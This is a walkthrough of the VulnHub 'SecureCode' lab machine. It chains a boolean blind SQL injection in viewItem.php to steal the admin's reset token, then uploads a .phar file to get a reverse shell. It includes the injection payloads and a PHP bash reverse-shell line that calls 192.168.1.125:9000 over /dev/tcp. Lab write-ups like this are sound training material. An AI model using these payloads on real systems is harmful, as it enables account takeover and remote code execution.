## Secure Code - VulnHub

https://www.vulnhub.com/entry/securecode-1%2C651/

The machine consists on the following steps:
* Find Boolean Blind SQL Injection;
* Extract reset password token from admin;
* Upload file with .phar extension and get reverse shell.

OBS: you can find the source code on **/source_code.zip**.

<br>

### Blind SQL Injection
We see a lot of queries in the source code, all of them protected by mysqli_real_escape_string().

One of them do not protect the variable inside quotation marks. This happens on line 18 on **viewItem.php**.
```php
$data = mysqli_query($conn, "SELECT * FROM item WHERE id = $id");
```

This may be vulnerable to SQL Injection.

Based on the snippet above, we can discover that there is a difference in response between existing and not existing IDs.
```php
if(isset($result['id'])){
    http_response_code(404);
}
```

We can observe this difference with curl.
```
# This returns 404
curl -v 192.168.1.123/item/viewItem.php?id=1

# This returns 302
curl -v 192.168.1.123/item/viewItem.php?id=1000
```

We find that it's vulnerable to injection with this simple payloads:
```
curl -v 192.168.1.123/item/viewItem.php?id=5+OR+1=1 # Returns 404
curl -v 192.168.1.123/item/viewItem.php?id=5+OR+1=2 # Returns 302
```

We can test the database queries in: https://extendsclass.com/mysql-online.html.

We can filter admin results with:
```
select * from user where id = 1;
```

Testing query with known username:
```
select (select substring(username,1,1) from user where id=1) = 'a';
```

Inserting token in user to test:
```
UPDATE user SET token = 'tokenValue' WHERE id = 1;
select (select substring(token,1,1) from user where id=1) = 't';
```

We just need to adjust our query to use ascii, since we need to bypass mysqli_real_escape_string().
```
select (select ascii(substring(username,1,1)) from user where id=1) = 97;
```

And our final payload will be (remember to URL encode this):
```
4 AND (select ascii(substring(token,%s,1)) from user where id=1) = %s;
```

Now we can extract token and change the password, check line 75 of **resetPassword.php** to get the format:
```
/login/doResetPassword.php?token=cbDupvFbxzjodgW
```

<br>

### Reverse Shell via File Upload
On **newItem.php**, two checks are being made: check for extensions, but no for .phar and check for this mimes: mimes = array("image/jpeg", "image/png", "image/gif");

But on **editItem.php**, only the extension check is being done, so we can upload a .phar reverse shell file.
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.125/9000 0>&1'");?>
```

And access `http://192.168.1.123/item/image/shell.phar` to get the shell.
